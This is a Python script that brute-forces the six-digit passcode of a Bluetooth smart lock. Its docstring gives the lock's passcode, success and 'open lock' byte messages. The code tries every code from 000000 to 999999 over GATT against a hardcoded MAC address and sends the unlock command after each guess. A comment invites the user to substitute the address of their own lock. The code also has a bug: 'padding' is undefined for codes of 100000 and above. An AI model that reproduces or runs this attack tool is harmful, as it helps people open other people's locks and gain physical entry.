'''
This script attempts to send the passcode for the lock.
The send passcode message looks like this:

0x29 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0x28

The "0xXX" place holders represents the passcode.

For example, if the passcode was "123456" the message would look like:

0x29 0x01 0x02 0x03 0x04 0x05 0x06 0x28

This script attempts to brute force each original passcode from 000000 to 999999, though this method takes a long time due to how slow the bluetooth connection is. Based on math and not actual testing, it should take around 8 hours to brute force the code via this method.

If the passcode is found, then the lock will respond with the message "0x59 0xf0 0x00 0x95". Then this script will automatically try to send the "open lock" command, which is "0xFE, 0x4F 0x50 0x45 0x4E 0x00 0x00 0x00 0x00 0xFD".
'''
import pygatt
from binascii import hexlify
import sys
import math
from concurrent import futures
import random
import time

print(time.time())

adapter = pygatt.backends.GATTToolBackend()

def guess_password_method(i):
    password_code = bytearray([0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28])
    open_code = bytearray([0xFE, 0x4F, 0x50, 0x45, 0x4E, 0x00, 0x00, 0x00, 0x00, 0xFD])
    if len(str(i)) < 6:
        padding = "0" * (6 - (int(len(str(i)))))
        padding += str(i)
    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        password_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    #if i % 100 == 0:
    #    print('sending 0xff 0x00 0xff')
    #    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", bytearray([0xFF, 0x00, 0xFF]))
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", password_code)
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", open_code)
    yay = padding + " " + code
    return yay


def handle_data(handle, value):
    response = hexlify(value)
    if "59f00095" in str(response):
        print("Received 'guess password success' repsonse (%s)" % str(response))
        #sys.exit(0)


adapter.start()
print("Connecting...")
#
#
#
#
# change the MAC address to whatever the address is for your lock
device = adapter.connect('28:EC:9A:09:EC:EF')
#
#
#
#
#

device.subscribe("0000ffd4-0000-1000-8000-00805f9b34fb",callback=handle_data)
device.subscribe("0000ffdf-0000-1000-8000-00805f9b34fb", indication=False, wait_for_response=True)

ex = futures.ThreadPoolExecutor(max_workers=100)
print('Starting...')

i = 0
while i != 1000000:
    print(guess_password_method(i))
    i = i + 1

adapter.stop()


print(time.time())
